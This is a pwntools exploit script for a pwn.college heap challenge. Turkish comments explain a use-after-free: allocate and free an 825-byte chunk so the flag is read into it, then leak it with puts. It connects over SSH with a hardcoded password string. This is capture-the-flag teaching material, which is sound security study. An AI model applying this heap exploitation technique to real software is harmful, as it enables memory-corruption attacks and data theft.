#!/usr/bin/python3
from pwn import *
import sys

try:
    arg = sys.argv[1]
except:
    arg = "yok"

print("""
            ###             ###
            ###             ###
            ###             ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
    ####################################
    ####################################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
        ###########################
        ###########################
            ###     ###     ###
            ###     ###     ###
            ###     ###     ###
                    ###
                    ###
                    ###
                    ###
""")


isim = "./babyheap_level1_teaching1"
context.arch = "amd64"

if arg == "remote":
    con = ssh(user="cse466", host="cse466.pwn.college",password="passworforrsakey", keyfile="~/.ssh/id_rsa")
    p = con.process(isim)
else:
    p = process(isim)


if arg == "debug":
    script = ""
    pid = gdb.attach(p.pid,script)

def malloc(size):
    p.sendline("malloc")
    p.sendline(str(size))
    p.read()

def free():
    p.sendline("free")
    p.read()

def readf():
    p.sendline("read_flag")
    p.read()

def put():
    p.sendline("puts")
    oku = p.recvuntil(b"Data: ")
    return p.readline().rstrip().decode()


# use after free var. flag okumak icin 825 byte alan ayiriyor.
# eger biz 825 byte lik bir alan ayirip serbest birakirsak flag bizim ayirdigimiz alana okunur.
# boyle puts ile flag i okuyabilirz
# ./level1.py remote

p.read()

malloc(825)
free()
readf()
flag = put()
print(f"Flag is: {flag}")
